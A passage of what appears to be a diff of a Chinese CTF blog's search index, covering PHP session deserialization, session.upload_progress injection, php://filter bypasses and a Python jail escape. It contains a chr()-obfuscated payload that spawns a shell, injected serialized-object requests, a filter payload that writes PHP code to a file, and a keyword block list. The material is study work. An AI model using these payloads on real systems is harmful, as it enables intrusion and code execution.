class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)),<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))[<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)](<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">104</span>))</span><br></pre></td></tr></table></figure>
 
-<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
-<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
-<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
-<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
-<p>demo改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最终效果：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601205811054.png" alt="image-20240601205811054"></p>
+<p>得到flag。</p>
+<h3 id="calc-jail-beginner-level2-JAIL"><a href="#calc-jail-beginner-level2-JAIL" class="headerlink" title="calc_jail_beginner_level2(JAIL)"></a>calc_jail_beginner_level2(JAIL)</h3><p>关键源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
 
-<p>结果如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
-<p>两张图片可以对比一下</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
-<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
-<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
-<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
-<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
-<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
-<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
-<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
-<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
-<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
-<p>flag.php：</p>
-<p>这个页面用于接受session的值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>1.php：</p>
-<p>这个页面用于测试反序</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先访问1.php，输出</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
-<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
-<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
-<p>在电脑上看一看此时session的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以看到成功写入，这是再访问以下1.php</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
-<p>成功反序。</p>
-<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
-<ul>
-<li>两个文件session引擎配置不同</li>
-<li>其中一个session可控</li>
-<li>两个文件同域</li>
-</ul>
-<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
-<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
-<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
-<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
-<p>条件：</p>
-<ol>
-<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
-<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
-</ol>
-<p>这两个都是可在查的</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
-<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
-<p><strong>对session上传进度说明一下：</strong></p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
-<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
-
-<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
-<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
-
-<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
-<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
-<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
-<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
-<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
-<p>开始解析：</p>
-<ul>
-<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
-<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
-</ul>
-<p>脚本后面补，遇到题再搓出来。</p>
-<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
-<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
-]]></content>
-      <categories>
-        <category>php相关漏洞</category>
-        <category>php反序列化</category>
-        <category>session反序列化</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>filter过滤器利用总结</title>
-    <url>/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
-<span id="more"></span>
-
-<h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
-<p>基本格式为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>
-
-<p>说明：</p>
-<table>
-<thead>
-<tr>
-<th>项目</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>resource</td>
-<td>在<code>php://filter</code>中，<code>resource</code>参数是必须的。<code>resource</code>用于指定<code>需要进行筛选过滤的数据流</code></td>
-</tr>
-<tr>
-<td>read</td>
-<td><code>read</code>参数指定<code>一个或多个过滤器</code>用于<code>读</code>操作，多个过滤器之间以管道符&#96;</td>
-</tr>
-<tr>
-<td>write</td>
-<td><code>write</code>参数指定<code>一个或多个过滤器</code>用于<code>写</code>操作，多个过滤器之间以管道符&#96;</td>
-</tr>
-<tr>
-<td>无read或write为前缀</td>
-<td>任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</td>
-</tr>
-</tbody></table>
-<p>注意：任何没有与<code>read=</code>或<code>write=</code>作前缀的筛选器列表会<code>视情况应用于读或写操作</code>。这意味着在指定筛选器的过程中，<code>read</code>与<code>write</code>参数可被忽略。</p>
-<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>以<code>file_get_contents()</code>函数为例：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#flag&#123;123ahdiuahd&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#ZmxhZ3sxMjNhaGRpdWFoZH0=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#synt&#123;123nuqvhnuq&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>以<code>file_put_contents()</code>函数为例:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/resource=11.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#11.txt文件内容：hello world</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=convert.base64-encode/resource=12.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#12.txt文件内容：aGVsbG8gd29ybGQ=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=13.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#13.txt文件内容：uryyb jbeyq</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" alt="image-20240522172738818"></p>
-<p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
-<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" alt="image-20240521145500302"></p>
-<p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>说明一下区别：</strong></p>
-<ul>
-<li><p>2和3区别： 为什么<code>&lt;haha</code>也会全部被删除，这是因为当调用<code>strip_tags()</code>时，它会执行以下操作，</p>
-<p>（1）它会从左到右扫描字符串，找到第一个<code>&lt;</code>，</p>
-<p>（2）继续扫描直到找到<code>&gt;</code>，<strong>在此过程中，所有字符都被认为是标签的一部分</strong>。</p>
-<p>（3）移除标签：将<code>&lt;</code>和<code>&gt;</code>之间的所有内容删除。</p>
-</li>
-<li><p>2与3区别：</p>
-</li>
-<li></li>
-</ul>
-<p>清晰明了。</p>
-<ul>
-<li><p>4和5区别：空格位置不同导致结果也不同，这就有html中的标签和属性有关了，首先，标签名称不能包含空格，但是标签属性部分可以包含空格，如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>则在这里:</p>
-<p>（1）<code>&lt;a&gt;</code>是标签名称，表示一个超链接元素，</p>
-<p>（2）<code>href=&quot;https://example.com&quot;</code> 是一个属性，指定链接的目标 URL。</p>
-<p>（3）<code>target=&quot;_blank&quot;</code> 是另一个属性，指定链接打开的方</p>
-</li>
-</ul>
-<p>所以标签名称前面是不能有空格的，后面有没有无所谓，就算有空格都只是被当做标签名称与属性分隔的地方。</p>
-<p><strong>这里一定要注意：</strong></p>
-<ul>
-<li><p><code>&lt;</code>对应<code>&gt;</code>代表结束，<code>&lt;?</code>一定要有<code>?&gt;</code>才代表结束</p>
-</li>
-<li><p>php元素（<code>&lt;?</code>）没有前面必须没有空格的说法，只要是这在这两个相对应的符号之间的内容全部都会被去除</p>
-</li>
-</ul>
-<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*:"></a>convert.iconv.*:</h6><p>这个过滤器需要<code>php</code>支持<code>iconv</code>。而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
-<p><code>iconv</code>——将字符串按要求的字符编码来转换</p>
-<p><code>convert.iconv.*</code>有两种使用方法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可用的字符编码：（其他可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
-
-<p>等如压缩过滤器的其他过滤器的利用可以自己去看</p>
-<h6 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h6><p>比如有的时候会对过滤器进行过滤，如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); </span><br></pre></td></tr></table></figure>
-
-<p><strong>此时有个小知识点</strong>：伪协议处理时会对过滤器<code>urldecode</code>过滤一次。</p>
-<p>所以可以利用二次编码绕过，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</span><br></pre></td></tr></table></figure>
-
-<p>可以直接在burp上使用<code>URL-encode all characters</code>对其进行URL全编码,主要是要将字符也编码。</p>
-<p>并且在自己的搭建的环境也成功测试。</p>
-<h3 id="利用编码解码来’模糊’代码"><a href="#利用编码解码来’模糊’代码" class="headerlink" title="利用编码解码来’模糊’代码"></a>利用编码解码来’模糊’代码</h3><p>这里以文件包含的<code>死亡exit()</code>绕过为例子，比如有下面的代码：</p>
